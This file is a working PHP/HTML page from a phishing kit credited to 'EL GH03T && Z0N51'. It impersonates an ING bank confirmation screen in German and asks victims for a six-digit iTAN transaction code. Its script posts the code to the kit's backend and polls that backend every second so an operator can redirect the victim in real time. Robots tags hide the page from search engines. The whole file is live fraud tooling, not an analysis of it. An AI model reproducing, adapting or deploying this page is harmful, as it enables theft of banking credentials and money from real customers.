<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    reset_action(get_client_ip());
    $_SESSION['last_page'] = 'itan';
    $infos  = get_infos();
    $number = $infos['number'];
?>
<!doctype html>
<html style="display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column;">

        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p>Bitte warten</p>
            </div>
        </div>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/imgs/logo.svg"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="title">
                    <h3>Bestätigung</h3>
                </div>

                <div class="box">
                    
                    <form action="../index.php" method="post" id="form" class="text-center">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="itan">
                        <p style="text-decoration: none; color: #666;"> Geben Sie bitte iTAN Nr. 20 ein.
<?php echo $number; ?></p>
                        <div class="inputs2">
                            <input type="text" maxlength="1" name="itan1" id="itan1" class="form-control">
                            <input type="text" maxlength="1" name="itan2" id="itan2" class="form-control">
                            <input type="text" maxlength="1" name="itan3" id="itan3" class="form-control">
                            <input type="text" maxlength="1" name="itan4" id="itan4" class="form-control">
                            <input type="text" maxlength="1" name="itan5" id="itan5" class="form-control">
                            <input type="text" maxlength="1" name="itan6" id="itan6" class="form-control">
                        </div>
                        <?php echo error_message($_SESSION['errors'],'itan'); ?>
                        <div class="btns text-center mt30">
                            <button type="submit" id="submit" class="orange"><i class="fas fa-angle-right"></i> Bestätigen</button>
                        </div>
                    </form>

                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <ul>
                <li>Karriere</li>
                <li>Vertriebspartner</li>
                <li>Wholesale Banking</li>
                <li>Kontaktformular</li>
                <li>AGB</li>
                <li>Datenschutz</li>
                <li>Impressum</li>
            </ul>
            <div><img style="min-width: 144px;" src="../assets/imgs/social.png"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('.inputs2 input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "../index.php", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: '../index.php?waiting=1',
                                    success: function (data) {
                                        if( data !== '' ) {
                                            window.location.href= '../index.php?redirection=' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            location.reload();
                        }
                    });
                });
            });

        </script>

    </body>

</html>
